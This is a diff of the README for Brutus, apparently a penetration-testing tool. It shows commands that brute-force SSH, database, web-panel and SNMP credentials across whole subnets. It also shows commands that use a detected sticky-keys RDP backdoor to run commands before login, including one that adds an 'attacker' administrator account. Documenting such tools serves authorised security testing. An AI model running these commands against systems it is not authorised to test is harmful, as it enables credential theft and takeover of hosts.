@@ -50,8 +50,11 @@ Traditional tools like **THC Hydra** have served the security community well, bu
 - **Library-first design:** Import Brutus directly into your Go security tools. Build custom automation without shelling out to external processes.
 
 ```bash
-# Full network credential audit in one pipeline
+# Full network credential audit in one pipeline (JSON mode)
 naabu -host 10.0.0.0/24 -p 22,3306,5432,6379 -silent | nerva --json | brutus --json
+
+# Or use Nerva's default URI output — no --json flags needed
+naabu -host 10.0.0.0/24 -p 22,3306,5432,6379 -silent | nerva | brutus
 ```
 
 ---
@@ -83,13 +86,23 @@ This pipeline discovers all SSH services, identifies them with Nerva, and tests 
 
 ### Web Admin Panel Testing
 
-Discover HTTP services with Basic Auth and test default credentials:
+Discover HTTP services and test credentials using AI-powered detection or manual credential lists:
 
 ```bash
-# Discover and test admin panels across a network
+# AI-powered: auto-detect devices and suggest default credentials
 naabu -host 10.0.0.0/24 -p 80,443,3000,8080,9090 -silent | \
   nerva --json | \
-  brutus --json
+  brutus web --experimental-ai --json
+
+# Manual: test specific credentials against web panels
+naabu -host 10.0.0.0/24 -p 80,443,8080 -silent | \
+  nerva --json | \
+  brutus web -c "admin:admin,root:password" --json
+
+# Default wordlist: test common credentials without AI or -c
+naabu -host 10.0.0.0/24 -p 80,443,8080 -silent | \
+  nerva --json | \
+  brutus web --json
 ```
 
 ### Security Validation
@@ -136,29 +149,75 @@ go install github.com/praetorian-inc/brutus/cmd/brutus@latest
 
 ## Quick Start
 
+### Subcommands
+
+Brutus organizes its functionality into five focused subcommands:
+
+```bash
+brutus creds    # Non-HTTP credential auditing (SSH, databases, SMB, etc.)
+brutus web      # HTTP/web panel auditing (Basic Auth, form login, AI-powered)
+brutus snmp     # SNMP community string testing
+brutus badkeys  # Known weak/compromised SSH key testing
+brutus logon    # Windows logon-screen backdoor detection (sticky keys, utilman)
+```
+
+Each subcommand has aliases for discoverability:
+
+| Subcommand | Aliases |
+|------------|---------|
+| `creds` | `services`, `defaults`, `credentials` |
+| `web` | `http`, `panels` |
+| `snmp` | `community` |
+| `badkeys` | `keys`, `ssh-keys`, `badkey` |
+| `logon` | `stickykeys`, `sticky-keys`, `utilman`, `sethc`, `winlogon`, `accessibility` |
+
+```bash
+# Test SSH credentials
+brutus creds --target 192.168.1.100:22 --protocol ssh -u root -p toor
+
+# Test HTTP web panel with AI credential detection
+brutus web --target 192.168.1.1:80 --experimental-ai
+
+# Test HTTP web panel with manual credentials
+brutus web --target 192.168.1.1:80 -c "admin:admin,root:toor"
+
+# Test SNMP community strings
+brutus snmp --target 192.168.1.1:161 --mode extended
+
+# Detect Windows logon-screen backdoors
+brutus logon --target 10.0.0.50:3389
+
+# Pipeline mode: creds skips HTTP/SNMP, web skips non-HTTP, snmp skips non-SNMP
+naabu -host 10.0.0.0/24 -silent | nerva --json | brutus creds -P passwords.txt
+naabu -host 10.0.0.0/24 -p 80,443,8080 -silent | nerva --json | brutus web --experimental-ai
+naabu -host 10.0.0.0/24 -p 161 -silent | nerva --json | brutus snmp --mode full
+```
+
+> **Backward compatible:** The flat CLI (`brutus --target ... --protocol ...`) still works. Subcommands are optional.
+
 ### Basic Usage
 
 ```bash
 # Test SSH with embedded badkeys (tested by default)
-brutus --target 192.168.1.100:22 --protocol ssh
+brutus creds --target 192.168.1.100:22 --protocol ssh
 
 # Test with specific credentials
-brutus --target 192.168.1.100:22 --protocol ssh -u root -p toor
+brutus creds --target 192.168.1.100:22 --protocol ssh -u root -p toor
 
 # Test with username and password lists
-brutus --target 192.168.1.100:22 --protocol ssh -U users.txt -P passwords.txt
+brutus creds --target 192.168.1.100:22 --protocol ssh -U users.txt -P passwords.txt
 
 # Test MySQL database
-brutus --target 192.168.1.100:3306 --protocol mysql -u root -p password
+brutus creds --target 192.168.1.100:3306 --protocol mysql -u root -p password
 
 # Test SSH with a specific private key
-brutus --target 192.168.1.100:22 --protocol ssh -u deploy -k /path/to/id_rsa
+brutus creds --target 192.168.1.100:22 --protocol ssh -u deploy -k /path/to/id_rsa
 
 # Increase threads for faster testing
-brutus --target 192.168.1.100:22 --protocol ssh -t 20
+brutus creds --target 192.168.1.100:22 --protocol ssh -t 20
 
 # JSON output for scripting
-brutus --target 192.168.1.100:22 --protocol ssh --json
+brutus creds --target 192.168.1.100:22 --protocol ssh --json
 ```
 
 ### Output Example
@@ -200,6 +259,10 @@ Brutus integrates seamlessly with **[Nerva](https://github.com/praetorian-inc/ne
 naabu -host 10.10.10.0/24 -p 22,23,21,3306,5432,6379,27017,445 -silent | \
   nerva --json | \
   brutus --json -o results.json
+
+# Same pipeline using Nerva's default URI output (no --json needed)
+naabu -host 10.10.10.0/24 -p 22,23,21,3306,5432,6379,27017,445 -silent | \
+  nerva | brutus -o results.json
 
 # Review findings (all output is successful credentials)
 cat results.json | jq '.'
@@ -264,17 +327,32 @@ naabu -host 10.0.0.0/24 -p 27017 -silent | \
 
 ### Pipeline Input Format
 
-Brutus accepts input from Nerva in JSON format:
+Brutus accepts multiple input formats from stdin:
 
+**Nerva JSON** (`nerva --json`):
 ```bash
-# nerva JSON output
 {"ip":"192.168.1.100","port":22,"protocol":"ssh","tls":false,"transport":"tcp","version":"OpenSSH_8.9p1"}
 {"ip":"192.168.1.101","port":3306,"protocol":"mysql","tls":false,"transport":"tcp","version":"8.0.32"}
-{"ip":"192.168.1.102","port":6379,"protocol":"redis","tls":false,"transport":"tcp","version":"7.0.5"}
+```
+
+**Nerva URI** (default Nerva output, no `--json` needed):
+```bash
+# Nerva outputs URI-scheme lines by default
+$ echo "github.com:22" | nerva
+ssh://github.com:22 (20.205.243.166)
+
+# Pipe directly to Brutus — protocol is extracted from the URI scheme
+echo "10.0.0.1:22" | nerva | brutus creds
+echo "10.0.0.0/24:3306" | naabu -silent | nerva | brutus creds
+```
+
+**Bare targets** (auto-fingerprinted with Nerva):
+```bash
+echo "192.168.1.100:22" | brutus creds
 ```
 
 Brutus automatically:
-- Parses the JSON stream
+- Parses JSON, URI scheme, and bare target formats
 - Maps services to protocols
 - Tests appropriate default credentials
 - Outputs results in matching JSON format
@@ -395,6 +473,38 @@ naabu -host 10.0.0.0/24 -p 22 -silent | nerva --json | brutus --badkeys-only
 
 ---
 
+## SNMP Community String Testing
+
+The `snmp` subcommand provides dedicated SNMP v1/v2c community string testing with tiered wordlists controlled by the global `--mode` flag:
+
+| Mode | Strings | Coverage |
+|------|---------|----------|
+| `default` | ~20 | Common strings (public, private, community, etc.) |
+| `extended` | ~50 | Adds vendor-specific (Cisco, HP, Juniper, etc.) |
+| `full` | ~120 | Comprehensive (SCADA, IP cameras, storage, etc.) |
+
+```bash
+# Test with default community strings
+brutus snmp --target 192.168.1.1:161
+
+# Extended mode for more coverage
+brutus snmp --target 192.168.1.1:161 --mode extended
+
+# Full mode for comprehensive testing
+brutus snmp --target 10.0.0.1:161 --mode full
+
+# Custom community strings
+brutus snmp --target 192.168.1.1:161 -c "mycommunity,secretstring"
+
+# Custom community string file
+brutus snmp --target 192.168.1.1:161 -C community-strings.txt
+
+# Pipeline mode
+naabu -host 10.0.0.0/24 -p 161 -silent | nerva --json | brutus snmp --mode extended
+```
+
+---
+
 ## Library Integration
 
 For developers building security automation tools, Brutus can also be imported as a Go library:
@@ -422,7 +532,6 @@ func main() {
         Passwords:     []string{"password", "admin", "toor"},
         Timeout:       5 * time.Second,
         Threads:       10,
-        StopOnSuccess: true,
     }
 
     results, err := brutus.Brute(config)
@@ -456,7 +565,7 @@ export PERPLEXITY_API_KEY="your-perplexity-key"  # Optional: additional web sear
 # AI-powered credential testing against HTTP services
 naabu -host 192.168.1.0/24 -p 80,443,8080 -silent | \
   nerva --json | \
-  brutus --experimental-ai
+  brutus web --experimental-ai
 ```
 
 **How it works:**
@@ -502,21 +611,18 @@ Brutus includes automatic detection of the **sticky keys backdoor** (MITRE ATT&C
 6. Optionally confirms via Claude Vision API (when `ANTHROPIC_API_KEY` is set)
 
 ```bash
-# Detection only — no brute force (no credentials provided)
-brutus --target 10.0.0.50:3389 --protocol rdp --sticky-keys
+# Detection only — no brute force
+brutus logon --target 10.0.0.50:3389
 
 # Detection + Vision API confirmation
-brutus --target 10.0.0.50:3389 --protocol rdp --sticky-keys --experimental-ai
+brutus logon --target 10.0.0.50:3389 --experimental-ai
 ```
 
-**Detection-only mode:** When `--sticky-keys` is used without explicit credentials (`-p`/`-P`/`-k`), Brutus skips brute force entirely and only runs sticky keys detection. To combine detection with credential testing, provide credentials explicitly:
+**Detection-only mode:** The `logon` subcommand runs sticky keys and utilman backdoor detection without brute force:
 
 ```bash
 # Detection only (no brute force)
-brutus --target 10.0.0.50:3389 --protocol rdp --sticky-keys
-
-# Detection + credential testing
-brutus --target 10.0.0.50:3389 --protocol rdp --sticky-keys -u administrator -p "Password1"
+brutus logon --target 10.0.0.50:3389
 ```
 
 **Detection output:**
@@ -527,28 +633,28 @@ sethc.exe has been replaced with cmd.exe or similar.
 SYSTEM-level unauthenticated access available via 5x Shift.
 ```
 
-### Command Execution via Sticky Keys (`--sticky-keys-exec`)
+### Command Execution via Backdoor (`--exec`)
 
 Once a backdoor is detected, execute a command on the remote system through the pre-auth command prompt:
 
 ```bash
 # Execute a single command via the backdoor
-brutus --target 10.0.0.50:3389 --protocol rdp --sticky-keys --sticky-keys-exec "whoami"
+brutus logon --target 10.0.0.50:3389 --exec "whoami"
 
 # Add a local admin account
-brutus --target 10.0.0.50:3389 --protocol rdp --sticky-keys \
-  --sticky-keys-exec "net user attacker P@ssw0rd /add && net localgroup administrators attacker /add"
+brutus logon --target 10.0.0.50:3389 \
+  --exec "net user attacker P@ssw0rd /add && net localgroup administrators attacker /add"
 ```
 
 This connects, triggers the backdoor, types the command, presses Enter, waits for output, and saves a PNG screenshot of the result.
 
-### Interactive Web Terminal (`--sticky-keys-web`)
+### Interactive Web Terminal (`--web`)
 
 Launch a browser-based RDP viewer for live interaction with the backdoor command prompt:
 
 ```bash
 # Start interactive web terminal
-brutus --target 10.0.0.50:3389 --protocol rdp --sticky-keys --sticky-keys-web
+brutus logon --target 10.0.0.50:3389 --web
 ```
 
 This starts a local HTTP server with:
@@ -637,7 +743,7 @@ Both flags can be combined (`--nla-check --sticky-keys-scan`) to run both checks
 
 ### Sticky Keys Heuristic Detection
 
-- **Alternating false negatives:** The heuristic-only detection (`--sticky-keys` without `--experimental-ai`) may produce false negatives on repeated scans against the same target. After a successful detection, the cmd.exe window remains open on the server. Subsequent connections see the cmd.exe in the baseline frame, and since sending 5x Shift doesn't create a new window, the pixel difference is minimal — resulting in a "clean" verdict. This does not affect `--experimental-ai` mode, which uses Vision API analysis of the response frame directly (not a baseline-vs-response diff) and reliably identifies the terminal window regardless of prior state.
+- **Alternating false negatives:** The heuristic-only detection (`brutus logon` without `--experimental-ai`) may produce false negatives on repeated scans against the same target. After a successful detection, the cmd.exe window remains open on the server. Subsequent connections see the cmd.exe in the baseline frame, and since sending 5x Shift doesn't create a new window, the pixel difference is minimal — resulting in a "clean" verdict. This does not affect `--experimental-ai` mode, which uses Vision API analysis of the response frame directly (not a baseline-vs-response diff) and reliably identifies the terminal window regardless of prior state.
 - **Workaround:** Use `--experimental-ai` with `ANTHROPIC_API_KEY` set for consistent detection across repeated scans, or allow a cooldown between scans for the RDP session to reset.
 
 ### Browser Plugin
